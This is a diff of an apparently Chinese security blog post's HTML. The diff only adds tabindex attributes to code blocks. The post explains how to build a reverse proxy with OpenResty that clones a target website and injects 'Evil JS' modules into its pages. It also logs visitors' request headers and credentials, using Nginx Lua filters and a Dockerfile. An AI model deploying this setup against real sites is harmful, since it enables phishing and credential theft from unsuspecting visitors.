@@ -107,7 +107,7 @@
 <h3 id="openresty---lua-ngx-api">OpenResty - Lua Ngx API</h3>
 <p>若想要在Nginx配置中执行Lua代码，需要遵循<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>，文档中提供了<code>*_by_lua</code>，<code>*_by_lua_block</code>和<code>*_by_lua_file</code>来引入Lua代码。</p>
 <p><code>nginx.conf</code>简单实例：</p>
-<pre><code>worker_processes  1;
+<pre tabindex="0"><code>worker_processes  1;
 
 error_log  logs/error.log error;    # 日志级别
 
@@ -139,17 +139,17 @@ http {
 </ul>
 <h3 id="nginx-反向代理配置">Nginx 反向代理配置</h3>
 <p><a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">Nginx反向代理</a>配置起来非常简单。</p>
-<pre><code>location /some/path/ {
+<pre tabindex="0"><code>location /some/path/ {
     proxy_pass http://www.example.com/link/;
 }
 </code></pre><p><code>location</code>用于做URI匹配，当访问到<code>/some/path/</code>这个路径时，Nginx就代表客户端去访问<code>http://www.example.com/link/</code>，整个过程对客户端是完全透明的。</p>
 <p>根据这个实例，可以直接写下第一部分，反向代理的配置了：</p>
-<pre><code>location / {
+<pre tabindex="0"><code>location / {
     proxy_pass http://www.example.com/link/;
 }
 </code></pre><p>访问根目录就等同于访问<code>http://www.example.com/link/</code>。</p>
 <p>这里可能会产生一个问题，如果目标Web服务器对Host进行了判断，那么反向代理可能不会成功，因此需要将完美克隆的目标Host进行设置。</p>
-<pre><code>worker_processes  1;
+<pre tabindex="0"><code>worker_processes  1;
 
 error_log  logs/error.log error;    # 日志级别
 
@@ -171,7 +171,7 @@ http {
 </code></pre><p>至此，就能完美克隆目标网站了。</p>
 <h2 id="0x03-注入模块化的evil-js">0x03 注入模块化的Evil JS</h2>
 <p>使用<code>body_filter_by_lua_block</code>可以对网站内容进行修改，利用好这个功能，就能将JS文件引入到页面中。</p>
-<pre><code>header_filter_by_lua_block { ngx.header.content_length = nil}
+<pre tabindex="0"><code>header_filter_by_lua_block { ngx.header.content_length = nil}
                 body_filter_by_lua_block{
                         local chunk, eof = ngx.arg[1], ngx.arg[2]
                         local buffered = ngx.ctx.buffered
@@ -197,14 +197,14 @@ http {
 </code></pre></div><p>其中<code>static.js</code>就是引入的Evil JS，添加了<code>type='module'</code>是为了启用<a href="https://www.freecodecamp.org/news/learn-modern-javascript/">ES6+</a>标准。</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8e4954b7fb5035a91688a21d78633140.png" alt="2021-02-16-17-10-54"></p>
 <p>为了不和源站的目录冲突，<code>7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code>location</code>映射即可。</p>
-<pre><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
+<pre tabindex="0"><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
                 alias    /tmp/pricking/static/;
 }
 </code></pre><p>关于Import的说明可以看<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">这篇文章</a>。</p>
 <p>使用模块化功能可以让这个项目吸收更多关于浏览器丰富的操作，就像XSS平台那样。</p>
 <h2 id="0x04-记录日志或凭证">0x04 记录日志或凭证</h2>
 <p>由于<code>log_by_lua_block</code>是最后一个流程，可以把一些数据进行收集，写入日志文件。</p>
-<pre><code>...
+<pre tabindex="0"><code>...
 
 http {
     ....
@@ -227,7 +227,7 @@ http {
 }
 </code></pre><p><code>ngx.localtime()</code>和<code>ngx.req.raw_header()</code>是调用了<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>。</p>
 <h2 id="0x05-最终配置">0x05 最终配置</h2>
-<pre><code>worker_processes  1;
+<pre tabindex="0"><code>worker_processes  1;
 events {
     worker_connections  1024;
 }
@@ -284,7 +284,7 @@ http {
 }
 </code></pre><h2 id="0x06-dockerfile编写">0x06 Dockerfile编写</h2>
 <p>Dockerfile :</p>
-<pre><code>FROM openresty/openresty:alpine
+<pre tabindex="0"><code>FROM openresty/openresty:alpine
 ENV PROXY_PASS_HOST www.baidu-proxy.com # 自己的域名
 ENV PROXY_SOURCE_HOST www.baidu.com # 要克隆的域名
 ENV NGINX_LISTEN_PORT 80 # 监听端口，不建议改动
